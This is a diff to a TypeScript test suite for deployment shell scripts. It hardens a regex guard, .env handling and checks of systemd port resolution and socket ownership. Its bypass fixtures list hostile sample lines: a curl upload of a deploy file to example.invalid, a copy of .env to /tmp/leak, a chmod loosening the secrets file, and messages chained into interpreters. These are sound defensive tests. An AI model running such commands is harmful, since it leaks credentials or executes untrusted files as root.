@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict'
 import { execFileSync, spawn } from 'node:child_process'
-import { existsSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { test } from 'node:test'
@@ -4987,6 +4987,14 @@ const MENTION_HAZARDS: ReadonlyArray<{ why: string; where: 'line' | 'code'; matc
 ]
 
 /**
+ * ONE ARGUMENT OF ONE SIMPLE COMMAND: a double-quoted string with no embedded `"`, a
+ * single-quoted string, a short option, or a bare variable expansion. Deliberately NOT a general
+ * shell word — a bare word would readmit `echo safe; …`, since `safe;` is a word to a scanner
+ * that does not know where a command ends.
+ */
+const MESSAGE_ARGUMENT = '("[^"]*"|\'[^\']*\'|-[A-Za-z]+|\\$\\{[A-Za-z_][A-Za-z0-9_]*\\}|\\$[A-Za-z_][A-Za-z0-9_]*)'
+
+/**
  * Stage two. Each shape must match the WHOLE trimmed line, and each carries WHY it is not a
  * second reader — because that is the property being claimed.
  */
@@ -5016,7 +5024,7 @@ const MENTION_SHAPES: ReadonlyArray<{ why: string; match: RegExp }> = (
     { why: "install.sh's raw round-trip snapshot for re-run defaults", match: 'load_existing_env "\\$\\{APP_DIR\\}/\\.env"' },
     // Shape and readability tests. They stat the path; they do not open it. Anchored whole-line,
     // so `[[ -f X ]] && bash X` is not one of these — the `&&` has nowhere to live.
-    { why: 'a file-shape or readability test opening a block', match: 'if \\[\\[[^\\]]*\\]\\]; then' },
+    { why: 'a file-shape or readability test opening a block', match: '(el)?if \\[\\[[^\\]]*\\]\\]; then' },
     { why: 'a file-shape or readability test guarding a refusal', match: '\\[\\[[^\\]]*\\]\\] \\|\\| die "[^"]*"' },
     // The path itself, assigned to a name.
     { why: 'a path assignment', match: `(local )?[A-Za-z_][A-Za-z0-9_]*="(${APP_OWNED_PATH})"` },
@@ -5042,13 +5050,25 @@ const MENTION_SHAPES: ReadonlyArray<{ why: string; match: RegExp }> = (
     { why: 'the unit directive install.sh writes', match: 'EnvironmentFile=-?\\$\\{APP_DIR\\}/\\.env' },
     // Text shown to an operator. A path inside a message is not a read — and with the hazards
     // above already applied, a message can no longer smuggle a substitution in with it.
-    { why: 'operator-facing text', match: '(die|warn|error|info|success|echo|echo -e|printf) .*' },
+    //
+    // ONE SIMPLE COMMAND, AND ITS ARGUMENTS (o3d-2sm1.5 r28, Codex MEDIUM). r27 wrote the tail as
+    // `.*`, and `.*` is not a grammar: it consumes a command separator and everything after it,
+    // so `echo safe; dash "${APP_DIR}/.env"` classified as operator-facing text while executing
+    // an application-owned file AS ROOT. The path scan saw the line, no hazard matched (`dash` is
+    // not in the interpreter list, and no interpreter list can be complete), and the shape
+    // swallowed the second command whole. Adding `dash` would have closed one spelling of an
+    // unbounded family — `&&`, `|`, `&`, `;`, and every interpreter nobody has named.
+    //
+    // So the tail is a grammar. Each argument is a quoted string, a short option or a bare
+    // variable expansion; a separator is none of those, and the anchoring does the rest. `>&2`
+    // and a trailing `\` are the two continuations these scripts actually use.
+    { why: 'operator-facing text, one simple command', match: `(die|warn|error|info|success|echo|printf)( ${MESSAGE_ARGUMENT})+( >&2)?( \\\\)?` },
     // A refusal message continued onto its own line, and the REASON strings the callers set.
     { why: 'an operator message continued onto its own line', match: '"[^"]*"( >&2)?' },
     {
       why: 'a refusal reason recorded for an operator',
       match:
-        '((([A-Za-z_]+|\\*)\\) )?)(local )?(DB_IDENTITY_(SOURCE_|DRIFT_)?REASON|UNIT_PORT_REASON|APP_PORT_REASON|RESPONDER_REASON|description|RESUME_EVIDENCE)="[^"]*"( ;;)?',
+        '((([A-Za-z_]+|\\*)\\) )?)(local )?(DB_IDENTITY_(SOURCE_|DRIFT_)?REASON|ENV_VAR_SOURCE_REASON|APP_LAYOUT_REASON|UNIT_PORT_REASON|APP_PORT_REASON|RESPONDER_REASON|description|RESUME_EVIDENCE)="[^"]*"( ;;)?',
     },
   ] as ReadonlyArray<{ why: string; match: string }>
 ).map((shape) => ({ why: shape.why, match: new RegExp(`^(${shape.match})$`) }))
@@ -5123,6 +5143,14 @@ const MENTION_BYPASSES: ReadonlyArray<{ label: string; line: string }> = [
   { label: 'a path assignment with the file exfiltrated after it', line: 'DEPLOY_META_FILE="${APP_DIR}/.deploy-meta" && curl -T "${DEPLOY_META_FILE}" https://example.invalid' },
   { label: 'a file test that then loosens the file mode', line: '[[ -f "${APP_DIR}/.env" ]] && chmod 644 "${APP_DIR}/.env"' },
   { label: 'the one reader with a copy of the file appended', line: 'DATABASE_URL="$(env_file_value DATABASE_URL "${APP_DIR}/.env")" && cp "${APP_DIR}/.env" /tmp/leak' },
+  // r27's THIRD escape from the operator-message shape, and the reason its tail is a grammar now
+  // rather than a longer list of interpreter names: NEITHER of these carries a hazard. `dash` and
+  // `tclsh` are absent from MENTION_HAZARDS — as any finite list of interpreters always will be —
+  // and each line's first command really is operator-facing text. Only "exactly one simple
+  // command" rejects them.
+  { label: 'a message with a second command after a semicolon', line: 'echo safe; dash "${APP_DIR}/.env"' },
+  { label: 'a message with a second command after &&', line: 'warn "checked" && tclsh "${APP_DIR}/.deploy-meta"' },
+  { label: 'a message piped into an interpreter nobody listed', line: 'echo "${APP_DIR}/.env" | ksh' },
 ]
 
 test('the declared-shape guard rejects every known way past it', () => {
@@ -5241,6 +5269,170 @@ for (const scenario of APP_PORT_CASES) {
   })
 }
 
+// ---------------------------------------------------------------------------
+// THE .env REFUSAL THAT USED TO ABANDON A FENCE (o3d-2sm1.5 r28, Codex HIGH).
+//
+// `[[ -f "${APP_DIR}/.env" ]] || die` sat in top-level initialisation — before the EXIT trap,
+// before the cutover lock and before marker adoption — and refused on a path the APPLICATION USER
+// OWNS. After an interrupted migration that account could delete the file and the recovery run
+// walked out: service left stopped, reboot fence left standing, crontab left commented out,
+// connection fence left un-adopted, and no trap installed to say any of it. The same shape r27
+// moved for the port, two lines above it, left in place for a year.
+//
+// Two things are proven here, and they are different claims: initialisation no longer aborts,
+// and the ADOPTION STILL RUNS before the refusal does.
+// ---------------------------------------------------------------------------
+
+/** The layout gate, lifted out of update.sh verbatim by its own condition. */
+function layoutGate(source: string): string {
+  const lines = source.split(/\r?\n/)
+  const start = lines.findIndex((line) => /^if \[\[ -n "\$\{APP_LAYOUT_REASON\}" \]\]; then$/.test(line))
+  assert.notEqual(start, -1, 'the layout refusal must still be a top-level gate of its own')
+  let end = start
+  while (end < lines.length && lines[end] !== 'fi') end += 1
+  assert.ok(end < lines.length, 'the layout gate must be closed by a fi in column 0')
+  return lines.slice(start, end + 1).join('\n')
+}
+
+/**
+ * update.sh's REAL prelude, its REAL adoption block and its REAL layout gate, in that order,
+ * against a real ${APP_DIR} and a real fence marker on disk.
+ *
+ * Only two things are synthetic. `--dry-run` is what lets the prelude run unprivileged (the root
+ * check is `$EUID -ne 0 && ! $DRY_RUN`, and EUID is read-only in bash), and DRY_RUN is put back to
+ * false immediately afterwards so the adoption block takes the REAL path rather than printing what
+ * it would do — that is exactly the substitution "run this as root" would make. Everything the
+ * adoption then calls that reaches systemd, cron or a database is stubbed into ${LOG}; the ORDER
+ * of those calls, which is the whole finding, is the shipped code's.
+ */
+function runLayoutGate(options: { env: string | null; marker: string | null }): {
+  status: number
+  output: string
+  log: string
+} {
+  const dir = mkdtempSync(join(tmpdir(), 'ims-layout-'))
+  const state = mkdtempSync(join(tmpdir(), 'ims-layout-state-'))
+  try {
+    if (options.env !== null) writeFileSync(join(dir, '.env'), options.env)
+    if (options.marker !== null) writeFileSync(join(state, 'DEPLOY-FENCED'), options.marker)
+    const log = join(state, 'calls.log')
+    const source = UPDATE_LINES.join('\n')
+    const program = [
+      preludeThrough(UPDATE_LINES, /^DB_OBJECT_ACCESS_SCRIPT=/),
+      `LOG=${JSON.stringify(log)}`,
+      ': > "${LOG}"',
+      'DRY_RUN=false',
+      // Everything below reaches systemd, cron, /etc or a database. None of it is the subject.
+      'systemctl(){ echo "systemctl $*" >> "${LOG}"; return 0; }',
+      'ss(){ return 1; }',
+      'install_reboot_fence(){ echo "install_reboot_fence" >> "${LOG}"; REBOOT_FENCE_INSTALLED=true; return 0; }',
+      'remove_reboot_fence(){ echo "remove_reboot_fence" >> "${LOG}"; return 0; }',
+      'adopt_cron_fence(){ echo "adopt_cron_fence" >> "${LOG}"; CRON_FENCED=true; return 0; }',
+      'adopt_db_connections(){ echo "adopt_db_connections" >> "${LOG}"; DB_FENCE_UP=true; return 0; }',
+      'release_db_connections(){ echo "release_db_connections" >> "${LOG}"; DB_FENCE_UP=false; return 0; }',
+      'resume_from_interrupted_arming(){ echo "resume_from_interrupted_arming" >> "${LOG}"; return 0; }',
+      shellFunction(source, 'marker_is_complete'),
+      shellFunction(source, 'marker_phase'),
+      shellFunction(source, 'predecessor_is_active'),
+      adoptionBlock(source),
+      layoutGate(source),
+      'echo "PAST_THE_GATE=yes"',
+    ].join('\n')
+    const result = runShell(
+      `IMS_APP_DIR=${JSON.stringify(dir)} IMS_CUTOVER_STATE_DIR=${JSON.stringify(state)} bash -s -- --dry-run <<'IMS_LAYOUT_EOF'\n${program}\nIMS_LAYOUT_EOF`,
+    )
+    return { ...result, log: readFileSync(log, 'utf8') }
+  } finally {
+    rmSync(dir, { recursive: true, force: true })
+    rmSync(state, { recursive: true, force: true })
+  }
+}
+
+/** What an interrupted run that had already begun migrating leaves behind. */
+const MIGRATING_MARKER = [
+  'phase=stopping',
+  'migration_attempted=true',
+  'schema_touched=true',
+  'reason=interrupted',
+  'marker_complete=1',
+  '',
+].join('\n')
+
+test('a deleted .env does not make a recovery run abandon a standing fence', () => {
+  // THE LOAD-BEARING CASE. The marker says a previous run had begun migrating, and the
+  // application-owned .env is GONE — which is the state the application account can produce at
+  // will, and the exact one where walking away is most expensive.
+  //
+  // MUTATION ROUTE (verified by making the change locally and re-running): put the old line back
+  // beside the read in update.sh —
+  //   [[ -f "${APP_DIR}/.env" ]] || die ".env not found. Run install.sh first."
+  // — and the log below is EMPTY: no stop, no reboot fence, no connection fence, because the run
+  // exited during initialisation. Every assertion about the log fails, and it fails for the right
+  // reason: the prelude died before the adoption block was ever reached.
+  const gone = runLayoutGate({ env: null, marker: MIGRATING_MARKER })
+
+  // The adoption happened, in full, and it happened FIRST.
+  assert.match(gone.log, /systemctl stop/, `the service must be re-stopped before anything is refused:\n${gone.log}`)
+  assert.match(gone.log, /install_reboot_fence/, `and the reboot fence re-established:\n${gone.log}`)
+  assert.match(gone.log, /adopt_cron_fence/, `and the cron fence confirmed:\n${gone.log}`)
+  assert.match(gone.log, /adopt_db_connections/, `and a fence over a touched schema HELD, not released:\n${gone.log}`)
+  assert.ok(!/release_db_connections/.test(gone.log), `and never released over a schema that may be half applied:\n${gone.log}`)
+  const stopAt = gone.log.indexOf('systemctl stop')
+  const fenceAt = gone.log.indexOf('install_reboot_fence')
+  assert.ok(stopAt !== -1 && fenceAt !== -1 && stopAt < fenceAt, `the stop comes before the re-fence:\n${gone.log}`)
+
+  // And THEN the refusal, which is a refusal and not a shrug.
+  assert.notEqual(gone.status, 0, `a run with no .env must still refuse:\n${gone.output}`)
+  assert.ok(!/PAST_THE_GATE/.test(gone.output), 'and it must not fall through the gate')
+  assert.match(gone.output, /cannot read the application's own configuration/, `and say why:\n${gone.output}`)
+  assert.match(gone.output, /does not exist/, 'naming what is wrong with the file')
+  assert.match(gone.output, /has just been ADOPTED above/, 'and telling the operator what state the box is in')
+
+  // THE CONTROL, so none of the above is the harness stopping everything: the same run with the
+  // file present adopts identically and walks PAST the gate.
+  const present = runLayoutGate({
+    env: 'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\n',
+    marker: MIGRATING_MARKER,
+  })
+  assert.equal(present.status, 0, `with the file present the gate must let the run continue:\n${present.output}`)
+  assert.match(present.output, /PAST_THE_GATE=yes/, 'and reach what comes after it')
+  assert.match(present.log, /systemctl stop/, 'having adopted the same fence')
+})
+
+test('every shape of an unreadable .env is refused at the gate, not during initialisation', () => {
+  // The file can be replaced as well as removed, and `-f` was the only shape r27's line checked.
+  // MUTATION ROUTE: delete any one `elif` branch from the APP_LAYOUT_REASON block and the matching
+  // case below reports status 0 and PAST_THE_GATE — the run continues with a file it cannot read.
+  const cases: ReadonlyArray<{ label: string; make: (dir: string) => void; says: RegExp }> = [
+    { label: 'a directory where the file should be', make: (dir) => mkdirSync(join(dir, '.env')), says: /is not a regular file/ },
+    { label: 'a dangling symlink', make: (dir) => symlinkSync(join(dir, 'nowhere'), join(dir, '.env')), says: /does not exist/ },
+  ]
+  for (const scenario of cases) {
+    const dir = mkdtempSync(join(tmpdir(), 'ims-layout-shape-'))
+    try {
+      scenario.make(dir)
+      // The prelude alone: this half of the claim is that INITIALISATION survives it.
+      const prelude = runUpdatePrelude(dir, ['APP_LAYOUT_REASON', 'ENV_FILE_APP_PORT'])
+      assert.equal(prelude.status, 0, `${scenario.label}: initialisation must not abort:\n${prelude.output}`)
+      assert.match(prelude.output, /^APP_LAYOUT_REASON=.+$/m, `${scenario.label}: and it must record why:\n${prelude.output}`)
+      assert.match(prelude.output, scenario.says, `${scenario.label}: naming the shape:\n${prelude.output}`)
+    } finally {
+      rmSync(dir, { recursive: true, force: true })
+    }
+  }
+
+  // PRECONDITION, so the two above are not passing because the block records a reason for
+  // everything: a healthy .env records NO reason at all.
+  const good = mkdtempSync(join(tmpdir(), 'ims-layout-good-'))
+  try {
+    writeFileSync(join(good, '.env'), 'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\n')
+    const prelude = runUpdatePrelude(good, ['APP_LAYOUT_REASON'])
+    assert.match(prelude.output, /^APP_LAYOUT_REASON=$/m, `a readable .env must record no reason:\n${prelude.output}`)
+  } finally {
+    rmSync(good, { recursive: true, force: true })
+  }
+})
+
 test('a malformed APP_PORT in .env no longer aborts update.sh during initialisation', () => {
   // THE PLACEMENT FINDING (o3d-2sm1.5 r27, Codex HIGH). r26 made a malformed value fatal on the
   // line that read it — during top-level initialisation, before the EXIT trap is installed,
@@ -5284,6 +5476,10 @@ test('a malformed APP_PORT in .env no longer aborts update.sh during initialisat
 // ---------------------------------------------------------------------------
 function runPortResolution(options: {
   environment?: string
+  environmentFiles?: string
+  passEnvironment?: string
+  unsetEnvironment?: string
+  pamName?: string
   execStart?: string
   loadState?: string
   invocationPort?: string
@@ -5291,6 +5487,14 @@ function runPortResolution(options: {
 }): { status: number; output: string } {
   const source = UPDATE_LINES.join('\n')
   const environment = options.environment ?? 'as 0'
+  // The four later composition sources unit_env_var_sole_source() asks about for the `directive`
+  // layer. The DEFAULT is a unit that loads none of them, so `Environment=PORT=` really is the
+  // last word on the port there — which is what makes the file case below a difference and not
+  // the resolver simply refusing everything.
+  const environmentFiles = options.environmentFiles ?? 'a(sb) 0'
+  const passEnvironment = options.passEnvironment ?? 'as 0'
+  const unsetEnvironment = options.unsetEnvironment ?? 'as 0'
+  const pamName = options.pamName ?? 's ""'
   // One command that names no port — a real unit always has an ExecStart, and the question
   // these cases turn on is whether it carries a port option, not whether it exists.
   const execStart = options.execStart ?? 'a(sasbttttuii) 1 "/usr/bin/npm" 2 "npm" "start" false 0 0 0 0 0 0 0'
@@ -5299,16 +5503,29 @@ function runPortResolution(options: {
     'set -uo pipefail',
     `SERVICE_UNIT='${options.unit ?? 'app.service'}'`,
     options.invocationPort === undefined ? 'unset IMS_APP_PORT || true' : `IMS_APP_PORT='${options.invocationPort}'`,
-    'BUS_STRINGS=()',
+    'BUS_STRINGS=(); BUS_ENV_IGNORE_FLAGS=()',
     'UNIT_PORT=""; UNIT_PORT_SOURCE=""; UNIT_PORT_REASON=""',
     'APP_PORT=""; APP_PORT_SOURCE=""; APP_PORT_REASON=""',
+    'ENV_VAR_SOURCE_REASON=""',
+    // The environment-snapshot globals belong to the `file` layer; the `directive` layer never
+    // reaches them, and `set -u` still wants them to exist.
+    "DB_ENV_SNAPSHOT_FILE=/var/lib/one-two-inventory/deploy/db-identity.env",
+    "DB_ENV_SNAPSHOT_DROPIN_NAME=zz-deploy-db-identity.conf",
+    'DB_ENV_SNAPSHOT_PUBLISHED=false',
+    'DB_IDENTITY_REQUIRE_SNAPSHOT=false',
     // The stub answers the three questions the shipped code asks, in systemd's own rendering.
     'busctl(){',
     '  case "$*" in',
     `    *LoadUnit*) printf '%s\\n' 'o "/org/freedesktop/systemd1/unit/app_2eservice"' ;;`,
     `    *Unit\\ LoadState*) printf '%s\\n' '${loadState}' ;;`,
+    // EnvironmentFiles FIRST: `*Service\ Environment*` is a prefix of it, and a case arm that
+    // answers the wrong property with the right-looking rendering is a stub that lies.
+    `    *Service\\ EnvironmentFiles*) printf '%s\\n' '${environmentFiles}' ;;`,
     `    *Service\\ Environment*) printf '%s\\n' '${environment}' ;;`,
     `    *Service\\ ExecStart*) printf '%s\\n' '${execStart}' ;;`,
+    `    *Service\\ PassEnvironment*) printf '%s\\n' '${passEnvironment}' ;;`,
+    `    *Service\\ UnsetEnvironment*) printf '%s\\n' '${unsetEnvironment}' ;;`,
+    `    *Service\\ PAMName*) printf '%s\\n' '${pamName}' ;;`,
     '    *) return 1 ;;',
     '  esac',
     '}',
@@ -5316,6 +5533,9 @@ function runPortResolution(options: {
     shellFunction(source, 'bus_read_strings'),
     shellFunction(source, 'bus_array_count'),
     shellFunction(source, 'bus_unit_property'),
+    shellFunction(source, 'bus_element_names_variable'),
+    shellFunction(source, 'bus_read_env_ignore_flags'),
+    shellFunction(source, 'unit_env_var_sole_source'),
     shellFunction(source, 'unit_listen_port'),
     shellFunction(source, 'resolve_app_port'),
     'if resolve_app_port; then echo "PORT=${APP_PORT}"; echo "SOURCE=${APP_PORT_SOURCE}"; else echo "REFUSED=${APP_PORT_REASON}"; fi',
@@ -5339,7 +5559,11 @@ test('the polled port comes from the unit, by either of the two directives that 
 
   const fromEnvironment = runPortResolution({ environment: 'as 2 "NODE_ENV=production" "PORT=8080"' })
   assert.match(fromEnvironment.output, /^PORT=8080$/m, `Environment=PORT= must decide it when ExecStart names none:\n${fromEnvironment.output}`)
-  assert.match(fromEnvironment.output, /^SOURCE=app\.service's own Environment=PORT=$/m, 'and say so')
+  assert.match(
+    fromEnvironment.output,
+    /^SOURCE=app\.service's own Environment=PORT=, which nothing composed after it can redefine$/m,
+    'and say so — including that nothing composed later could have moved it',
+  )
 
   // Both, agreeing — this host's real units are written this way.
   const both = runPortResolution({
@@ -5399,6 +5623,100 @@ test('the polled port is refused rather than guessed at when the unit does not s
     const result = runPortResolution(scenario.options)
     assert.match(result.output, /^REFUSED=/m, `${scenario.label}: this must be refused, not guessed at:\n${result.output}`)
     assert.match(result.output, scenario.says, `${scenario.label}: the refusal must say what is wrong:\n${result.output}`)
+  }
+})
+
+test('an EnvironmentFile the unit loads can redefine PORT, so Environment=PORT= alone is refused', () => {
+  // THE r28 FINDING (Codex HIGH). systemd applies EnvironmentFile= AFTER Environment=, and the
+  // file the application service loads is written by the APPLICATION USER. r27 read
+  // `Environment=PORT=` as authoritative anyway — in the same script that had already refused
+  // every later composition source for DATABASE_URL, four hundred lines above.
+  //
+  // The rendering below is the shape systemd prints for THIS HOST's real units, checked
+  // read-only: `a(sb) 1 "<path>" true`, an environment file loaded with a leading `-`.
+  //
+  // MUTATION ROUTE (verified by making the change locally and re-running): delete the
+  // `unit_env_var_sole_source PORT directive` call from unit_listen_port() and this reports
+  // PORT=3000 — the value the unit's directive states and NOT the one the file would supply.
+  const viaFile = runPortResolution({
+    environment: 'as 1 "PORT=3000"',
+    environmentFiles: 'a(sb) 1 "/opt/app/.env" true',
+  })
+  assert.match(viaFile.output, /^REFUSED=/m, `a directive is not the composed environment:\n${viaFile.output}`)
+  assert.match(viaFile.output, /pins its port only in Environment=PORT=3000/, 'and the refusal must name what it read')
+  assert.match(viaFile.output, /also loads 1 environment file\(s\) \(\/opt\/app\/\.env\)/, 'and the source that could move it')
+  assert.match(viaFile.output, /EnvironmentFile= AFTER Environment=/, 'and why that source wins')
+
+  // THE CONTROL, so the refusal above is about the FILE and not about Environment= generally:
+  // the same unit with no environment file resolves, and the same unit with the file back but a
+  // literal ExecStart flag resolves too — which is what install.sh writes and what this host's
+  // real units carry, so the fix changes no working deployment.
+  const noFile = runPortResolution({ environment: 'as 1 "PORT=3000"' })
+  assert.match(noFile.output, /^PORT=3000$/m, `Environment=PORT= still decides it when nothing is composed after it:\n${noFile.output}`)
+  const pinnedInExecStart = runPortResolution({
+    environment: 'as 1 "PORT=3000"',
+    environmentFiles: 'a(sb) 1 "/opt/app/.env" true',
+    execStart: 'a(sasbttttuii) 1 "/usr/bin/npm" 5 "npm" "run" "start" "--port" "3000" false 0 0 0 0 0 0 0',
+  })
+  assert.match(
+    pinnedInExecStart.output,
+    /^PORT=3000$/m,
+    `an ExecStart flag is the one pin a later environment source cannot move:\n${pinnedInExecStart.output}`,
+  )
+
+  // AND THE OTHER THREE LATER SOURCES, which are the same doctrine and the same mechanism.
+  for (const [label, options, says] of [
+    ['a second environment file', { environmentFiles: 'a(sb) 2 "/opt/app/.env" true "/etc/other.env" false' }, /also loads 2 environment file\(s\)/],
+    ['PassEnvironment=PORT', { passEnvironment: 'as 1 "PORT"' }, /lists PORT in PassEnvironment=/],
+    ['UnsetEnvironment=PORT', { unsetEnvironment: 'as 1 "PORT"' }, /lists PORT in UnsetEnvironment=/],
+    ['PAMName=', { pamName: 's "login"' }, /sets PAMName=login/],
+  ] as ReadonlyArray<[string, Parameters<typeof runPortResolution>[0], RegExp]>) {
+    const result = runPortResolution({ environment: 'as 1 "PORT=3000"', ...options })
+    assert.match(result.output, /^REFUSED=/m, `${label} must be refused too:\n${result.output}`)
+    assert.match(result.output, says, `${label}: the refusal must name it:\n${result.output}`)
+  }
+})
+
+test('the environment-source doctrine is ONE mechanism, told which variable to ask about', () => {
+  // The finding behind the finding: r27 wrote a second port reader beside a doctrine that
+  // already answered the question, and applied that doctrine to exactly one variable. So the
+  // scan is parameterised now, and the DATABASE_URL entry point is a wrapper over it.
+  //
+  // MUTATION ROUTE: give unit_listen_port() its own copy of the EnvironmentFiles= scan instead
+  // of calling unit_env_var_sole_source() and the first assertion fails; hard-code
+  // `DATABASE_URL` back into unit_env_var_sole_source() and the second does.
+  const source = UPDATE_LINES.join('\n')
+  const scan = shellFunction(source, 'unit_env_var_sole_source')
+  assert.ok(
+    /local variable="\$\{1:-\}" layer="\$\{2:-\}"/.test(scan),
+    `the scan must take the variable and the layer as arguments:\n${scan.slice(0, 400)}`,
+  )
+  assert.ok(!/DATABASE_URL/.test(scan), 'and it must name no variable of its own')
+  assert.ok(/bus_element_names_variable "\$element" "\$variable"/.test(scan), 'and match on the name it was given')
+
+  // Both callers go through it, and there is no second copy of the question anywhere.
+  assert.ok(
+    /unit_env_var_sole_source DATABASE_URL file "\$@"/.test(shellFunction(source, 'env_file_is_sole_database_url_source')),
+    'the DATABASE_URL entry point must be a wrapper over the one scan',
+  )
+  assert.ok(
+    /unit_env_var_sole_source PORT directive/.test(shellFunction(source, 'unit_listen_port')),
+    'and the port resolver must ask the same one',
+  )
+  const callers = UPDATE_LINES.filter((line) => isCode(line) && /bus_unit_property "\$object" Service EnvironmentFiles/.test(line))
+  assert.equal(callers.length, 1, `EnvironmentFiles= must be read in exactly one place, found ${callers.length}`)
+
+  // AND NOTHING ELSE IN THE THREE ENTRYPOINTS READS `Environment=` WITH THE OLD ASSUMPTION.
+  // Every read of the property is either this scan or a copy of it; PORT was the one value taken
+  // from a directive and believed, and it is the one fixed. MUTATION ROUTE: add
+  // `bus_unit_property "$object" Service Environment` anywhere outside the scan in any of the
+  // three and this names that script.
+  for (const entry of R9_SCRIPTS) {
+    const reads = entry.source
+      .split(/\r?\n/)
+      .filter((line) => isCode(line))
+      .filter((line) => /Service Environment\b|systemctl show[^\n]*-p Environment\b/.test(line))
+    assert.ok(reads.length <= 1, `${entry.name} reads Environment= in ${reads.length} places; the doctrine lives in one:\n${reads.join('\n')}`)
   }
 })
 
@@ -5576,21 +5894,37 @@ test('the port gate runs after an existing fence is adopted and before anything 
 // grandchild of the unit's MainPID, inside its control group) and REFUSES :3002, which is the
 // e2e rig — the exact confusion an .env naming the wrong port would have produced.
 // ---------------------------------------------------------------------------
-function runSocketProof(options: { pids: number[]; cgroup: string; mainPid: number; port?: string }): { status: number; output: string } {
+function runSocketProof(options: {
+  pids: number[]
+  cgroup: string
+  mainPid: number
+  port?: string
+  /** Listening rows on the same port that `ss` attributes to NO pid — the r28 case. */
+  unattributed?: number
+}): { status: number; output: string } {
   const source = UPDATE_LINES.join('\n')
+  const port = options.port ?? '3000'
+  // A row with no `users:(…)` column at all is what `ss -ltnp` prints for a socket whose owning
+  // process this invocation cannot see. It is a LISTENER; it is simply not attributable.
+  const unattributedRows = Array.from(
+    { length: options.unattributed ?? 0 },
+    () => `LISTEN 0 511 0.0.0.0:${port} 0.0.0.0:*`,
+  )
   const rows = options.pids
-    .map((pid) => `LISTEN 0 511 0.0.0.0:${options.port ?? '3000'} 0.0.0.0:* users:(("next-server",pid=${pid},fd=20))`)
+    .map((pid) => `LISTEN 0 511 0.0.0.0:${port} 0.0.0.0:* users:(("next-server",pid=${pid},fd=20))`)
+    .concat(unattributedRows)
     .join('\n')
   const program = [
     'set -uo pipefail',
-    `APP_PORT='${options.port ?? '3000'}'`,
+    `APP_PORT='${port}'`,
     'SERVICE_UNIT=app.service',
     'RESPONDER_PIDS=""; RESPONDER_REASON=""',
+    'PORT_LISTENER_ROWS=0; PORT_LISTENER_UNATTRIBUTED=0; PORT_LISTENER_PIDS=""',
     `STUB_CGROUP='${options.cgroup}'`,
     `STUB_MAINPID=${options.mainPid}`,
     `ss(){ printf '%s\\n' '${rows}'; }`,
     'systemctl(){ case "$*" in *ControlGroup*) echo "$STUB_CGROUP" ;; *MainPID*) echo "$STUB_MAINPID" ;; esac; return 0; }',
-    shellFunction(source, 'port_listener_pids'),
+    shellFunction(source, 'port_listener_scan'),
     shellFunction(source, 'pid_in_service_cgroup'),
     shellFunction(source, 'pid_in_service_process_tree'),
     shellFunction(source, 'prove_service_owns_port'),
@@ -5627,9 +5961,39 @@ test('the health check proves the socket on the port belongs to the service, not
     const shared = runSocketProof({ pids: [pid, 1], cgroup, mainPid: pid })
     assert.match(shared.output, /^UNPROVEN=/m, `an unattributable second holder of the port fails the whole proof:\n${shared.output}`)
 
-    const nobody = runSocketProof({ pids: [], cgroup, mainPid: other })
+    const nobody = runSocketProof({ pids: [], unattributed: 1, cgroup, mainPid: other })
     assert.match(nobody.output, /^UNPROVEN=/m, `a socket ss attributes to no pid proves nothing:\n${nobody.output}`)
-    assert.match(nobody.output, /attributes that listening socket to no pid at all/, 'and says so')
+    assert.match(nobody.output, /attributes 1 of them to no pid at all/, 'and says so')
+
+    // AND THE MIXED CASE, WHICH IS THE r28 FINDING (Codex HIGH). One row the unit owns outright,
+    // one row `ss` can attribute to nobody. The old reader grepped `pid=` out of the rows and
+    // discarded the second, leaving a non-empty list containing only the trusted pid — every
+    // member of which then verified, so the proof PASSED. With SO_REUSEPORT the kernel may have
+    // handed the health request to the socket nobody could name.
+    //
+    // MUTATION ROUTE (both verified by making the change locally and re-running): restore the old
+    // one-pipeline reader —
+    //   ss -ltnp 2>/dev/null | awk -v p=":${APP_PORT}\$" '$4 ~ p' | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u
+    // — as port_listener_scan()'s body (setting PORT_LISTENER_PIDS from it) and this case reports
+    // PROVEN; alternatively delete the PORT_LISTENER_UNATTRIBUTED refusal from
+    // prove_service_owns_port() and it reports PROVEN while `nobody` above still fails.
+    const mixed = runSocketProof({ pids: [pid], unattributed: 1, cgroup, mainPid: pid })
+    assert.match(
+      mixed.output,
+      /^UNPROVEN=/m,
+      `one attributed listener beside one unattributable one is not a proof:\n${mixed.output}`,
+    )
+    assert.match(mixed.output, /shows 2 listening socket\(s\) on :3000 and attributes 1 of them to no pid at all/, 'and it must count the rows, not the pids')
+    assert.match(mixed.output, /an unknown and not an absent one/i, 'and say why a missing attribution is not a missing listener')
+
+    // AND THE CONTROL FOR IT: the same two rows with the second one attributed to the same unit
+    // still passes, so the refusal above is about ATTRIBUTION and not about there being two rows.
+    const twoOwned = runSocketProof({ pids: [pid, pid], cgroup, mainPid: pid })
+    assert.match(twoOwned.output, /^PROVEN=/m, `two rows both belonging to the unit are still the unit:\n${twoOwned.output}`)
+
+    // No rows at all is a different refusal from a row nobody owns, and it says so.
+    const noRows = runSocketProof({ pids: [], cgroup, mainPid: other })
+    assert.match(noRows.output, /reports no listening socket on that port at all/, `nothing listening is its own answer:\n${noRows.output}`)
   } finally {
     listener.kill('SIGKILL')
     stranger.kill('SIGKILL')
